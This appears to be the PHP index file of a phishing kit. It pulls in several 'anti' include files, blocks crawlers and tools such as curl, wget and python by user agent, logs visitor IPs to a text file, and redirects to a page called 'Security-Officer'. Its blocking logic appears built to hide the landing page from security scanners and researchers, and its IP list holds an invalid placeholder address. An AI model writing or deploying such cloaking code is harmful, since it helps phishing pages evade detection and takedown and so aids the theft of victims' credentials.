<?php
include('prevents/anti5.php');
include('prevents/anti1.php');
include('prevents/anti8.php');
include('prevents/anti2.php');
include('prevents/anti4.php');
include('prevents/anti7.php');
include('prevents/anti3.php');

// Anti-Bot Protection
function blockSuspiciousUserAgent() {
    $botAgents = [
        'curl', 'wget', 'bot', 'crawler', 'spider', 'http', 'python', 'java'
    ];
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botAgents as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            header("HTTP/1.1 403 Forbidden");
            exit('Access denied');
        }
    }
}

function blockSuspiciousIPs() {
    $blockedIPs = [
        '192.168.1.1', // Replace with actual IPs to block
        '123.456.789.0',
    ];
    if (in_array($_SERVER['REMOTE_ADDR'], $blockedIPs)) {
        header("HTTP/1.1 403 Forbidden");
        exit('Access denied');
    }
}

// Call protection functions
blockSuspiciousUserAgent();
blockSuspiciousIPs();
$visitor_ip = $_SERVER['REMOTE_ADDR'];
$file = 'visitors.txt';
file_put_contents($file, "IP: $visitor_ip\n", FILE_APPEND);
header('Location: Security-Officer');
exit;
?>
